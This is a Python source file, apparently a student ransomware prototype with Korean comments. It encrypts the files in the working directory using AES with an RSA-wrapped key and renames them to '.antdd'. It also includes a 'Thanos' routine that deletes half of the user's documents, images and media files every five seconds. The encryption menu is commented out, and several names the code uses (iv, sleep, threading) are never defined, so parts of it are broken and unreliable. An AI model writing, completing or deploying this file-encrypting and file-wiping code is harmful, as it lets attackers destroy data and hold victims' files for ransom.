from builtins import int, input, len, round, range

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto import Random  #RSA 키 생성시 필요
from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
import glob
import os

import binascii





def list_files(path, ext=None):
    filelist=[]
    print("os.listdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path,name)):
            if name.endswith('.py'):
                continue
            if (ext == None):
                filelist.append(name)
            elif name.endswith(ext):
                filelist.append(name)

    print("filelist: \n", filelist)
    return filelist

def startTimer():
    print("파일 삭제를 시작합니다")
    #5초에 한번씩 파일 삭제
    #threading.Timer(5,remove_files(os.getcwd())).start()
    sleep(5)
    remove_files(os.getcwd())

def remove_files(path,ext=None):
    #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
    #label6.pack()
    #label5.destroy()
    remove_filelist = []
    extlist = \
        ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
         'jpg', 'jpeg', 'png', 'gif',
         'mp3', 'wav', 'wma',
         'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
    print("os.listdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            for i in extlist:
                if name.endswith(i):
                    remove_filelist.append(name)
                else:
                    continue
    print("remove_filelist: \n", remove_filelist)

    if(len(remove_filelist)>2):
        n = 0
        if((len(remove_filelist) / 2 ) % 2 == 0):
            n=round(len(remove_filelist)/2) #정수로 변환
            print("지울 파일 개수: ", n)
        else:
            n=round(len(remove_filelist)/2)-1
            print("지울 파일 개수: ", n)

        for i in range(n):
            print(remove_filelist[i])
            os.remove(remove_filelist[i])
        print("파일 중 절반이 삭제되었습니다.")
    #파일이 1개 or 2개 남았을 경우
    elif(len(remove_filelist)>0):
        os.remove(remove_filelist[0])
    else:
#        for i in range(2):
#            os.remove(remove_filelist[i])
#        print("파일 중 절반이 삭제되었습니다.")
        print("더 이상 삭제할 파일이 없습니다")
        exit(0)

    #label6.destroy()
    #label7 = tkinter.Label(window, image=image)
    #label7.pack()

    threading.Timer(5, remove_files, [os.getcwd()]).start()

def enc(key, cipher, in_filename, out_filename=None):

    # RSA 로 AES 키 암호화
    ciphertext = cipher.encrypt(key)  # 128비트
    print(cipher.decrypt(ciphertext))
    print("\nRSA를 통한 key 암호화문 : \n", ciphertext, "\n")
    # /////////////////////////////////////////////////

    print("---START ENCRYPTION : AES")
    mode = AES.MODE_CBC
    #iv = b'Sixteen byte iv3'

    # enc의 결과로 나오는 파일 이름을 정한다
    if not out_filename:
        out_filename = in_filename + '.antdd'

    # 먼저, 바이너리 형식으로 파일을 읽어온다
    # 읽어온 것은 data로 저장

    with open(in_filename, 'rb') as infile:
        # 일단 읽어온 것을 출력해보자
        data = infile.read()

        print("1. Plain Message was: ")
        print(data, '\n', len(data))
        sizeOfData = len(data)

        # 패딩에 대한 부분
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length

        print("2. After Padding Message was: ")
        print(data)

        with open(out_filename, 'wb') as outfile:
            pass

        #이어쓰기 모드
        with open(out_filename, 'ab') as outfile:
            #RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
            outfile.write(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode())
            print('\ndata size : ',len(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode()))
            #RSA : 암호화된 AES 키를 넣어줌 (128바이트)
            outfile.write(ciphertext)
            encryptor = AES.new(key, mode, iv)
            e_data = encryptor.encrypt(data)
            # 그럼 e_data도 마찬가지로 b''형식이다.

            print("3. e_data Message was: ")
            print(e_data)

            outfile.write(e_data)

    # write가 완료된 상태에서 out_file을 읽어보자
    with open(out_filename, 'rb') as result:
        print("4. encryption result is: ", out_filename)
        print(result.read())

    print("---END ENCRYPTION : AES")
def dec( cipher, in_filename, out_filename):
    print("---START DECRYPTION : AES")

    mode = AES.MODE_CBC
    #iv = b'Sixteen byte iv3'

    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    print(out_filename)

    with open(in_filename, 'rb') as infile:
        e_data = infile.read()
        print('size : ',e_data[:64832])
        #RSA : 파일의 크기와 암호화된 AES 키 추출
        sizeOfData = int(e_data[:64832].lstrip(b'0').decode())
        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
        print(len(aes_key_enc), aes_key_enc)
        #RSA : 암호화된 진짜 원본 데이터 추출
        e_data = e_data[64960:]

        #RSA : 추출한 AES 키 복호환
        aes_key_dec = cipher.decrypt(aes_key_enc)
        print('AES key was :', aes_key_dec)
        print("1. Cipher was: ")
        print(e_data)

        with open(out_filename, 'wb') as outfile:
            decryptor = AES.new(aes_key_dec, mode, iv)

            d_data = decryptor.decrypt(e_data)

            print("2. before unpadding d_data")
            print(d_data)


            d_data = d_data[:sizeOfData]
            # 패딩 처리한 부분을 다시 지워준다
            # d_data = e_data[:-x[-1]] 에서 x[-1]의 값은 100
            # 바이트 크기로 인식하기 때문에 d->ascii->100
            #d_data = d_data[:d_data.rfind(x[-1]) + 1]

            #####print("어쩌구 후 d_data: ", d_data.decode('ascii'))
            ##target의 내용이 한글인 경우 에러발생
            # 아스키코드로 진행된 경우

            print("3. after unpadding d_data")
            # print(d_data.decode(encoding='utf-8'))

            outfile.write(d_data)

    # write가 완료된 상태에서 out_file을 읽어보자
    # 읽을 때 rb가 아니라 r로 읽으면
    # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
    with open(out_filename, 'rb') as result:
        print("4. decryption result is: ", out_filename)
        print(result.read())

    print("---END DECRYPTION : AES")


if __name__ == "__main__":

    key = os.urandom(16)

    #RSA : 키, 싸이퍼 생성
    random_generator = Random.new().read
    rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
    cipher = PKCS1_OAEP.new(rsa_key)
    private_key = rsa_key.export_key()
    print("비밀키는 : ", private_key)



    '''
    while True:
        menu = int(input("1. 암호화\t2. 복호화\t3. 나가기\n"))
        if (menu == 1):
            enc_targetlist = list_files(os.getcwd())    #os.getcwd는 해당 폴더에서 가져옴.
            #나중에 전체 트래킹 하는 법 알아야함
            print("enc_targetlist: \n", enc_targetlist)
            for enc_target in enc_targetlist:
                if enc_target.split('.')[-1]=='antdd':
                    continue
                enc(key, cipher,enc_target, out_filename=None)
                #remove_files(os.getcwd())
        elif (menu == 2):
            dec_targetlist = list_files(os.getcwd(), '.antdd')
            print("dec_targetlist: \n", dec_targetlist)
            for dec_target in dec_targetlist:
                #print(os.path.splitext(dec_target)[0])
                #x = get_tmp(os.path.splitext(dec_target)[0])
                print(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
                #x = get_tmp(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
                dec(cipher,dec_target, out_filename=None)  # x 없어야함
        elif (menu == 3):
            break
        else:
            continue
    '''
    #해당 파일들은 확인 끝남
    #text(key, 'target.txt')
    #text(key, '컴보.docx')
    #image(key, 'family.jpg')
    #image(key, '짱구얌.png')